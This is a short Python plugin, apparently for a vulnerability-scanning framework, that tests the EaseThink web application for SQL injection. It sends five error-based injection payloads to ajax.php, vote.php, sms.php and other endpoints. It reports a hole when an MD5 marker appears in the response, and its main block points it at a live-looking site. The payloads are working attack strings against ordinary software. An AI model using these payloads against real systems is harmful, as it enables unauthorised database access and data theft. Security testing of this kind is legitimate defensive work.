#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Tian.Te
def assign(service,arg):
    if service == "easethink":
        return True, arg

def audit(arg):
    payloads = {'ajax.php?act=check_field&field_name=a%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(123),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)#',
                'link.php?act=go&city=sanming&url=secer%27)%20and%20(updatexml(1,concat(0x3a,(select%20concat(md5(123))%20from%20jytuan_admin%20limit%201)),1))%23',
                'vote.php?act=dovote&name[1 and (select 1 from(select count(*),concat(0x7c,md5(123),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)%23][111]=aa',
                "subscribe.php?act=unsubscribe&code=secer') and (updatexml(1,concat(0x3a,(select concat(md5(123)) from easethink_admin limit 1)),1))#",
                "sms.php?act=do_unsubscribe_verify&mobile=a' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,md5(123),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#"
                }
    for payload in payloads:
        target_url = arg + payload
        code, head, res,errcode,_ = curl.curl('"%s"' % target_url)
        if code == 200 and "202cb962ac59075b964b07152d234b70"in res:
           
            security_hole(target_url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('easethink', 'http://www.easethink.com/')[1])